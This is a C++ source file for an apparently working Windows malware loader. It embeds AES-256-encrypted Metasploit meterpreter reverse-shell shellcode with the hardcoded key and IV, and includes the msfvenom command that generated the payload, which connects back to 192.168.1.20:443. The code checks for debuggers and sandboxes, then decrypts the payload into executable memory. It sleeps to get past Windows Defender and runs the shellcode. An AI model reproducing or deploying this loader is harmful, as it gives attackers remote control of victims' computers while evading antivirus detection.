// dllmain.cpp : Définit le point d'entrée de l'application DLL.
#define CBC 1
#include "aes.h"
#include <Windows.h>
#include <Wininet.h>
#include <stdbool.h> 
#include <stdio.h>
#include <string.h> 
#include <stdlib.h> 
#include <iostream>

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Wininet.lib")

using namespace std;

// Actual length of the payload 
#define PAYLOADLENGTH 650
#define IV "E7a0eCX76F0YzS4j"
#define KEY "6ASMkFslyhwXehNZw048cF1Vh1ACzyyR"
#define CLASSNAME "myWindowClass"
#define WINDOWTITLE "My Title"

// RC4 payload is used to maximize stealth during network communication. 
// ruby ./msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST=192.168.1.20 LPORT=443 SessionRetryTotal=60 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c
// No encoder or badchars specified, outputting raw payload
// Payload size: 650 bytes
// Final size of c file: 2780 bytes
unsigned char buf[] =
"\xf7\x31\x73\x5b\x3f\x3c\xc4\x90\x00\x8c\xaa\x14\xac\x21\x71"
"\x26\x16\x3d\x34\xed\x04\xac\xa8\xbe\x25\xdb\x69\x00\x07\x4f"
"\xf1\xeb\x28\x20\x01\xfe\xc8\xc8\x72\xa2\xb9\xee\x06\x95\x34"
"\x1a\x93\x57\x81\x5c\xb3\xbc\x83\xe3\x28\x8c\x32\x31\xf3\x33"
"\xb1\xdc\x59\x16\x4e\xb3\xe8\x8d\x5a\x33\x5f\xdd\xe1\x90\xaf"
"\xf0\xef\x1a\x71\x6d\xe5\x55\x4f\x1c\x80\xf4\x76\xb1\x39\x4b"
"\x0c\x6f\x2c\xc3\x86\xd4\x6a\x9f\x2a\x66\x54\xc3\x5e\x2f\x3a"
"\x9e\x95\x9f\x3b\xd7\x80\xa6\xbe\x8f\xdd\xd0\x3d\x53\x53\x36"
"\x5e\x10\xf1\x51\x6e\xb9\x6b\x9c\xd6\xfd\x2e\x9f\xd3\xa2\xfc"
"\xbe\xad\xd8\xed\x8e\xe2\x0e\xbe\x95\x8f\x93\xec\x44\x89\xa9"
"\x6c\xe7\xd1\x03\x83\x58\x18\xcf\xf6\x44\x8d\xa3\x46\xaa\x13"
"\xb5\xc2\xae\x2a\x5a\x73\xb4\xa5\x79\xdc\x9e\x2b\x26\x65\xd0"
"\x90\x20\xda\x2d\xab\x74\xf4\xa4\xe4\x1c\x79\xf8\xe0\x08\xc8"
"\xac\x86\x49\xf9\x9e\xb0\x84\xce\xcf\x92\xed\x80\x36\x02\xb8"
"\x9b\x8e\x38\x98\x25\xe7\x37\x4b\x7a\x92\xce\xa0\xd1\x16\x18"
"\x3e\x7e\xa2\x2d\xce\x44\xf9\xec\xc9\x06\x9e\x83\x8d\x7c\x54"
"\xca\x9a\x15\xa7\xd8\xf9\x33\x58\x2b\x97\x6e\xf5\x96\x1c\x77"
"\x69\xc6\x37\xc1\xb2\xc7\xab\x55\xb1\xa1\xb8\x10\xb3\x1c\x3e"
"\xff\xfe\x98\x7e\x9a\x98\x6a\x08\xd3\xb2\x7d\x15\xf3\x60\x7e"
"\xa9\xd5\x30\x05\xae\x38\xa5\xc7\x3f\x9e\x02\xdb\x5b\xa5\xcb"
"\x23\xd8\x3b\xa5\x2e\x71\x9f\x9f\xb8\x68\x29\x3e\x3b\xb2\x04"
"\xf6\x92\x0a\x84\x56\x05\xc5\x2a\xd7\xf3\x74\x6e\x8e\xe6\x73"
"\x2f\xd3\x3c\x6c\x17\x6f\x77\xe4\x66\x26\xa4\xf3\xc7\x49\x22"
"\x24\x31\xf5\x09\xae\xe0\xc5\x29\xb7\x5c\xa4\x11\x06\xe2\x44"
"\xe9\x76\x6e\x3d\x3f\xa8\x14\xdc\xf8\x61\xd9\x8d\x35\x8a\xe5"
"\xbe\x1f\xf9\xb8\x01\x4f\x75\xb9\x50\x56\xc1\xdb\x97\xcc\xb3"
"\x3f\xff\xa0\xc4\xd0\x1c\xcd\xa3\xc8\xe0\x44\x46\x00\xd3\x22"
"\xc1\xca\x68\x3d\x53\x65\xaa\xbf\xcc\x1d\xc0\x9c\x16\x94\xcd"
"\xad\x20\xd1\x9f\x92\xd9\xf8\x0b\xfc\x21\x65\x6a\xf6\xec\x57"
"\x21\x32\x93\xa0\xc7\x61\xd2\x6c\xaa\x82\xad\x8f\xf1\xaa\x64"
"\x80\xfb\xba\xeb\x25\xe4\x51\x85\x92\xc1\x2d\x6d\xbe\xc5\x15"
"\xcb\x43\x7e\x30\xb9\x47\x26\xe8\x83\x50\x2e\xb1\x43\xba\x99"
"\x7e\xd1\xcc\xc7\x16\x2d\x29\xfb\xaa\xd5\x16\x2e\x9d\xb0\x04"
"\xc4\x04\x48\x92\x60\x76\x66\x4f\xae\x52\x06\xc7\x77\x03\xf8"
"\xe4\xa9\x1c\xa0\x3b\x14\xfc\xa7\x70\x1f\xde\x34\x72\xbf\xf4"
"\xe8\xdf\x94\x00\x6e\xde\x2b\xf0\x35\xf8\xff\x11\x7a\x37\x1a"
"\x9c\x51\x99\x88\x09\xc7\x81\x45\x49\x5e\x9e\x92\xcd\x65\x2e"
"\x91\x0f\x0e\xc2\x8d\xad\x21\xd6\x88\x6f\x05\x42\xf2\xeb\xa1"
"\x0e\x1a\xee\x56\x5d\x70\x2f\xcc\x8b\x2c\xca\xb8\x40\x14\xfc"
"\xc4\xf0\x4a\xce\x67\x39\xc6\xd9\x9e\x89\xd0\x1c\xa6\x1f\x5d"
"\xb7\x83\x76\xb9\x17\x6f\x80\xb0\x03\x6c\x4b\xeb\x01\xc7\x3e"
"\xcf\xc5\xdb\x09\x15\xb4\xfe\x44\x8f\x54\x54\xdc\x16\xe7\x6c"
"\x27\xd1\xe9\x3c\x50\x7c\xda\x22\x94\x11\xfc\x5f\x6f\x59\x1d"
"\xfd\x5a\x75\x23\xd6\xa2\x06\x27\xe9\xd4\x56";




const int ENCRYPTEDBUFFERLENGTH = sizeof(buf);

namespace Aes256MsfPayload {
	class Utils {
	public:
		static char IsDbgPresent() {
			if (IsDebuggerPresent())
			{
				return 1;
			}
			return 0;
		}

		static bool IsSandboxPresent() {
			// Non-uniform memory access (NUMA) is a computer memory design used in multiprocessing, 
			// where the memory access time depends on the memory location relative to the processor.
			// https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
			return VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0) == NULL;
		}

		static DWORD WINAPI ExecuteCode(LPVOID lpPayload) {
			void(*func)();
			func = (void(*)()) lpPayload;
			(void)(*func)();
			return 0;
		}
	};

	class CryptoUtils {
	public:
		static void AES256Decrypt(uint8_t* uString, uint8_t* uIv, const char* uKey) {
			struct AES_ctx ctx;
			AES_init_ctx_iv(&ctx, uKey, uIv);
			AES_CBC_decrypt_buffer(&ctx, uString, PAYLOADLENGTH);

			// The last byte needs to a null-byte terminator to read correctly.
			memcpy((char*)uString + PAYLOADLENGTH, "\x00", 1);
		}
	};

	class ExecuteGenericPayload {
	public:
		void Start() {
			TCHAR s[256];

			LPVOID lpPayload = VirtualAlloc(NULL, ENCRYPTEDBUFFERLENGTH, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (lpPayload) {
				ZeroMemory(lpPayload, ENCRYPTEDBUFFERLENGTH);
				memcpy(lpPayload, buf, ENCRYPTEDBUFFERLENGTH);
			}
			else {
				return;
			}

			// uint8_t : 8 unsigned bits
			uint8_t* uPayload = (uint8_t*)lpPayload;
			uint8_t* uIv = (uint8_t*)IV;
			//uint8_t* uKey = (uint8_t*)KEY;

			CryptoUtils::AES256Decrypt(uPayload, uIv, KEY);

			// Also useful to bypass Sandboxing
			// AFAIK it's working for Windows Defender
			Sleep(10000);
			Utils::ExecuteCode(uPayload);
		}
	};
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	if (!Aes256MsfPayload::Utils::IsDbgPresent() && !Aes256MsfPayload::Utils::IsSandboxPresent()) {
		Aes256MsfPayload::ExecuteGenericPayload* p = new Aes256MsfPayload::ExecuteGenericPayload();
		try {
			p->Start();
			delete(p);
		}
		catch (const std::exception &e) {
		}
	}

	return 0;
}
